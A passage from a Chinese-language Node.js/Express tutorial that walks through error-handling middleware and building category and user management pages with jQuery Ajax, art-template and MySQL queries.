punctuation">)</span></code></pre><blockquote><p>注意：执行错误处理中间件挂载的代码必须在我们的路由执行挂载之后</p></blockquote><p>然后在我们的路由处理中，如果有错误，就调用 next 函数传递错误对象，例如</p><pre class=" language-javascript"><code class="language-javascript">rouget<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  xxx操作  <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 调用 next，传递 err 错误对象</span>    <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="使用-errorhandler-美化错误输出页面"><a href="#使用-errorhandler-美化错误输出页面" class="headerlink" title="使用 errorhandler 美化错误输出页面"></a>使用 errorhandler 美化错误输出页面</h6><blockquote><p>参考文档：<a href="https://github.com/expressjs/errorhandler" target="_blank" rel="noopener">https://github.com/expressjs/errorhandler</a></p></blockquote><p>安装</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## 注意：使用淘宝镜像源安装这个包可能会失败（淘宝镜像源也不能一劳永逸）</span><span class="token comment" spellcheck="true">## 建议使用 npm 官方镜像源安装这个包</span><span class="token function">npm</span> i errorhandler</code></pre><p>配置</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token keyword">const</span> errorhandler <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'errorhandler'</span><span class="token punctuation">)</span><span class="token operator">...</span><span class="token comment" spellcheck="true">// 后面讲发布部署的时候再将这种方式，不用修改代码，可以在程序的外部决定内部的执行逻辑</span><span class="token keyword">if</span> <span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>NODE_ENV <span class="token operator">===</span> <span class="token string">'development'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">errorhandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>也可以错误消息输出到系统通知</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token keyword">var</span> errorhandler <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'errorhandler'</span><span class="token punctuation">)</span><span class="token keyword">var</span> notifier <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-notifier'</span><span class="token punctuation">)</span><span class="token operator">...</span><span class="token keyword">if</span> <span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>NODE_ENV <span class="token operator">===</span> <span class="token string">'development'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// only use in development</span>  app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">errorhandler</span><span class="token punctuation">(</span><span class="token punctuation">{</span>log<span class="token punctuation">:</span> errorNotification<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 将错误输出消息输出到系统通知</span><span class="token keyword">function</span> errorNotification <span class="token punctuation">(</span>err<span class="token punctuation">,</span> str<span class="token punctuation">,</span> req<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> title <span class="token operator">=</span> <span class="token string">'Error in '</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>method <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>url  notifier<span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    title<span class="token punctuation">:</span> title<span class="token punctuation">,</span>    message<span class="token punctuation">:</span> str  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h6 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h6><h4 id="分类管理"><a href="#分类管理" class="headerlink" title="分类管理"></a>分类管理</h4><h6 id="分类列表"><a href="#分类列表" class="headerlink" title="分类列表"></a>分类列表</h6><p>一、页面加载，发起 Ajax 请求，获取分类列表数据，等待响应</p><pre class=" language-javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  url<span class="token punctuation">:</span> <span class="token string">'/api/categories'</span><span class="token punctuation">,</span>  method<span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>  data<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  dataType<span class="token punctuation">:</span> <span class="token string">'json'</span><span class="token punctuation">,</span>  success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 1. 判断数据是否正确</span>    <span class="token comment" spellcheck="true">// 2. 使用模板引擎渲染列表数据</span>    <span class="token comment" spellcheck="true">// 3. 把渲染结果替换到列表容器中</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  error<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'请求失败了'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>二、服务端收到请求，提供请求方法为 <code>GET</code>, 请求路径为 <code>/api/categories</code> 的路由，响应分类列表数据</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 1. 添加接口路由</span>router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/api/categories/list'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 2. 操作数据库获取数据</span>  db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT * FROM `ali_cate`'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">throw</span> err    <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 3. 把数据响应给客户端</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      success<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      data    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>三、客户端正确的收到服务端响应的数据了，使用数据结合模板引擎渲染页面内容</p><ol start="0"><li><p>配置客户端模板引擎</p><ol><li>下载</li><li>引用</li></ol></li><li><p>准备模板字符串</p></li></ol><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>list_template<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token punctuation">{</span><span class="token operator">%</span>each listData<span class="token operator">%</span><span class="token punctuation">}</span>  <span class="token operator">&lt;</span>tr<span class="token operator">></span>    <span class="token operator">&lt;</span>td <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"text-center"</span><span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"checkbox"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">></span>    <span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token punctuation">{</span><span class="token operator">%</span> $value<span class="token punctuation">.</span>cate_name <span class="token operator">%</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">></span>    <span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token punctuation">{</span><span class="token operator">%</span> $value<span class="token punctuation">.</span>cate_slug <span class="token operator">%</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">></span>    <span class="token operator">&lt;</span>td <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"text-center"</span><span class="token operator">></span>      <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:;"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"btn btn-info btn-xs"</span><span class="token operator">></span>编辑<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>      <span class="token operator">&lt;</span>a data<span class="token operator">-</span>id<span class="token operator">=</span><span class="token string">"{% $value.cate_id %}"</span> name<span class="token operator">=</span><span class="token string">"delete"</span> href<span class="token operator">=</span><span class="token string">"javascript:;"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"btn btn-danger btn-xs"</span><span class="token operator">></span>删除<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">/</span>tr<span class="token operator">></span>  <span class="token punctuation">{</span><span class="token operator">%</span><span class="token operator">/</span>each<span class="token operator">%</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token comment" spellcheck="true">// template('script 节点 id')</span>  <span class="token comment" spellcheck="true">// 当前页面是由服务端渲染出来的</span>  <span class="token comment" spellcheck="true">// 服务端先先对当前页面进行模板引擎处理</span>  <span class="token comment" spellcheck="true">// 服务端处理的时候根本不关心你的内容，只关心模板语法，我要解析替换</span>  <span class="token comment" spellcheck="true">// 当你的服务端模板引擎语法和客户端模板引擎语法一样的时候，就会产生冲突</span>  <span class="token comment" spellcheck="true">//    服务端会把客户端的模板字符串页给解析掉</span>  <span class="token comment" spellcheck="true">//    这就是所谓的前后端模板语法冲突</span>  <span class="token comment" spellcheck="true">// 修改模板引擎的语法界定符</span>  template<span class="token punctuation">.</span>defaults<span class="token punctuation">.</span>rules<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>test <span class="token operator">=</span> <span class="token regex">/{%([@##]?)[ \t]*(\/?)([\w\W]*?)[ \t]*%}/</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>后续处理：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>  <span class="token function">loadList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">/*   * 加载分类列表数据   */</span>  <span class="token keyword">function</span> <span class="token function">loadList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      url<span class="token punctuation">:</span> <span class="token string">'/api/categories'</span><span class="token punctuation">,</span>      method<span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>      data<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>      dataType<span class="token punctuation">:</span> <span class="token string">'json'</span><span class="token punctuation">,</span>      success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 1. 判断数据是否正确</span>        <span class="token comment" spellcheck="true">// 2. 使用模板引擎渲染列表数据</span>        <span class="token comment" spellcheck="true">// 3. 把渲染结果替换到列表容器中</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>success<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">var</span> htmlStr <span class="token operator">=</span> <span class="token function">template</span><span class="token punctuation">(</span><span class="token string">'list_template'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>            listData<span class="token punctuation">:</span> data<span class="token punctuation">.</span>data          <span class="token punctuation">}</span><span class="token punctuation">)</span>          <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'##list_container'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>htmlStr<span class="token punctuation">)</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      error<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'请求失败了'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>总结：</p><ul><li>客户端发起请求，等待响应</li><li>服务端收到请求</li><li>服务端处理请求</li><li>服务端发送响应</li><li>客户端收到响应</li><li>客户端根据响应结果进行后续处理</li></ul><h6 id="删除分类"><a href="#删除分类" class="headerlink" title="删除分类"></a>删除分类</h6><p>一、通过事件委托方式为动态渲染的删除按钮添加点击事件</p><ul><li>第一种把添加事件的代码放到数据列表渲染之后</li><li>第二种使用事件代理（委托）的方式</li></ul><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'##list_container'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token string">'a[name=delete]'</span><span class="token punctuation">,</span> handleDelete<span class="token punctuation">)</span><span class="token operator">...</span></code></pre><p>二、在删除处理中发起 Ajax 请求删除操作</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">handleDelete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>window<span class="token punctuation">.</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">'确认删除吗？'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span>  <span class="token punctuation">}</span>  <span class="token keyword">var</span> id <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 点击确定，发起 Ajax 请求，执行删除操作</span>  $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    url<span class="token punctuation">:</span> <span class="token string">'/api/categories/delete'</span><span class="token punctuation">,</span>    method<span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>    data<span class="token punctuation">:</span> <span class="token punctuation">{</span>      id<span class="token punctuation">:</span> id    <span class="token punctuation">}</span><span class="token punctuation">,</span>    dataType<span class="token punctuation">:</span> <span class="token string">'json'</span><span class="token punctuation">,</span>    success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    error<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">}</span></code></pre><p>三、在服务端添加路由接口处理删除操作</p><pre class=" language-javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/api/categories/delete'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 获取要删除的数据id</span>  <span class="token keyword">const</span> <span class="token punctuation">{</span> id <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query  <span class="token comment" spellcheck="true">// 操作数据库，执行删除</span>  db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'DELETE FROM `ali_cate` WHERE `cate_id`=?'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> ret<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">throw</span> err    <span class="token punctuation">}</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      success<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      ret    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>四、客户端收到响应结果，判断如果删除成功，重新请求加载数据列表</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">...</span>success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>success<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 删除成功，重新加载列表数据</span>    <span class="token function">loadList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">...</span></code></pre><h6 id="添加分类"><a href="#添加分类" class="headerlink" title="添加分类"></a>添加分类</h6><p>基本步骤：</p><ol><li>客户端发起请求，提交表单数据，等待服务端响应</li><li>服务端收到请求，处理请求，发送响应</li><li>客户端收到响应，根据响应结果进行后续处理</li></ol><p>一、客户端发起添加请求</p><ul><li>表单的 submit 提交事件</li><li>表单内容的获取 <code>$(表单).serialize()</code></li></ul><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 表单提交</span><span class="token comment" spellcheck="true">//  submit 提交事件</span><span class="token comment" spellcheck="true">//  1. button 类型为 submit 的会触发</span><span class="token comment" spellcheck="true">//  2. 文本框敲回车也会触发</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'##add_form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">,</span> handleAdd<span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function">handleAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// serialize 会找到表单中所有的带有 name 的表单元素，提取对应的值，拼接成 key=value&amp;key=value... 的格式数据</span>  <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'##add_form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    url<span class="token punctuation">:</span> <span class="token string">'/api/categories/create'</span><span class="token punctuation">,</span>    method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>    data<span class="token punctuation">:</span> formData<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// Content-Type 为 application/x-www-form-urlencoded</span>    <span class="token comment" spellcheck="true">// data: { // data 为对象只是为了让你写起来方便，最终在发送给服务器的时候，$.ajax 还会把对象转换为 key=value&amp;key=value... 的数据格式</span>    <span class="token comment" spellcheck="true">// 普通的表单 POST 提交（没有文件），必须提交格式为 key=value&amp;key=value... 数据，放到请求体中</span>    <span class="token comment" spellcheck="true">//   key: value,</span>    <span class="token comment" spellcheck="true">//   key2: value2</span>    <span class="token comment" spellcheck="true">// },</span>    dataType<span class="token punctuation">:</span> <span class="token string">'json'</span><span class="token punctuation">,</span>    success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>resData<span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>resData<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    error<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">}</span></code></pre><p>二、服务端处理请求</p><ol><li><p>在 app.js 中配置解析表单 POST 请求体</p><p>参考 <a href="https://github.com/expressjs/body-parser" target="_blank" rel="noopener">body-parser</a> 文档进行配置。</p></li><li><p>执行数据库操作和发送响应数据</p></li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">/** * 添加分类 */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/api/categories'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 1. 获取表单 POST 数据</span>  <span class="token keyword">const</span> body <span class="token operator">=</span> req<span class="token punctuation">.</span>body  <span class="token comment" spellcheck="true">// 2. 操作数据库</span>  db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>    <span class="token string">'INSERT INTO `ali_cate` SET `cate_name`=?, `cate_slug`=?'</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span>body<span class="token punctuation">.</span>cate_name<span class="token punctuation">,</span> body<span class="token punctuation">.</span>cate_slug<span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span>err<span class="token punctuation">,</span> ret<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 3. 发送响应</span>      res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        success<span class="token punctuation">:</span> <span class="token boolean">true</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>三、客户端收到响应，后续处理</p><ul><li>判断响应是否正确</li><li>如果正确，则重新加载最新的列表数据，清空表单内容</li></ul><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">...</span>success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>resData<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>success<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 添加成功，重新加载列表数据</span>    <span class="token function">loadList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 清空表单内容</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'##add_form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">'input[name]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">...</span></code></pre><h6 id="编辑分类"><a href="#编辑分类" class="headerlink" title="编辑分类"></a>编辑分类</h6><p>######## 动态显示编辑模态框</p><p>一、点击编辑，弹出模态框</p><ul><li>Bootstrap 自带的 JavaScript 组件：模态框</li></ul><p>二、发起 Ajax 请求，获取 id=xxx 的分类数据</p><p>三、服务端收到请求，获取 id，操作数据库，发送响应</p><p>四、客户端收到服务端响应，进行后续处理</p><p>######## 提交编辑表单完成编辑操作</p><p>一、注册编辑表单的提交事件</p><p>二、在提交事件中，获取表单数据，发送 Ajax  <code>POST</code>请求 <code>/api/categories/update</code>，提交的数据放到请求体中</p><ul><li><strong>表单隐藏域的使用</strong></li></ul><p>三、服务端收到请求，获取查询字符串中的 id，获取请求体，执行数据库修改数据操作，发送响应</p><p>四、客户端收到响应，根据响应结果做后续处理</p><h4 id="简单优化"><a href="#简单优化" class="headerlink" title="简单优化"></a>简单优化</h4><h6 id="客户端表单数据验证"><a href="#客户端表单数据验证" class="headerlink" title="客户端表单数据验证"></a>客户端表单数据验证</h6><ul><li>自己写，自己判断<ul><li>if-else 正则表达式，直接上</li></ul></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Learn/HTML/Forms/Data_form_validation" target="_blank" rel="noopener">HTML5 表单验证</a><ul><li>有兼容性问题</li><li>可以在兼容性比较好的移动端去使用</li><li>简单的校验需求就能满足</li></ul></li><li>基于 jQuery 的表单验证插件<ul><li>官方文档：<a href="https://jqueryvalidation.org/" target="_blank" rel="noopener">https://jqueryvalidation.org/</a></li><li>Github 仓库：<a href="https://github.com/jquery-validation/jquery-validation" target="_blank" rel="noopener">https://github.com/jquery-validation/jquery-validation</a></li><li>菜鸟教程翻译的一个参考文档：<a href="http://www.runoob.com/jquery/jquery-plugin-validate.html" target="_blank" rel="noopener">http://www.runoob.com/jquery/jquery-plugin-validate.html</a></li></ul></li></ul><h6 id="服务端数据验证"><a href="#服务端数据验证" class="headerlink" title="服务端数据验证"></a>服务端数据验证</h6><ul><li>基本数据校验</li><li>业务数据校验</li></ul><h6 id="客户端统一错误处理"><a href="#客户端统一错误处理" class="headerlink" title="客户端统一错误处理"></a>客户端统一错误处理</h6><ul><li>利用 jQuery 提供的全局 Ajax 事件处理函数：<a href="https://api.jquery.com/category/ajax/global-ajax-event-handlers/" target="_blank" rel="noopener">https://api.jquery.com/category/ajax/global-ajax-event-handlers/</a></li></ul><h4 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h4><h6 id="用户列表"><a href="#用户列表" class="headerlink" title="用户列表"></a>用户列表</h6><ol><li>添加路由，渲染 admin/users.html 页面</li><li>在 users.html 页面中套用模板页</li></ol><p>几个小点：</p><ul><li>把 art-template 文件资源的引用放到模板页中</li><li>把修改模板引擎默认语法规则的代码放到模板页中</li><li>把注册的全局 Ajax 错误处理方法放到模板页中</li></ul><h6 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h6><p>######## jQuery Validation Plugin 表单验证</p><ul><li><a href="https://jqueryvalidation.org/" target="_blank" rel="noopener">官网</a></li><li><a href="https://github.com/jquery-validation/jquery-validation" target="_blank" rel="noopener">Github 仓库</a></li><li><a href="http://www.runoob.com/jquery/jquery-plugin-validate.html" target="_blank" rel="noopener">菜鸟教程</a></li></ul><p>安装</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i jquery-validation</code></pre><p>加载</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jquery.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token 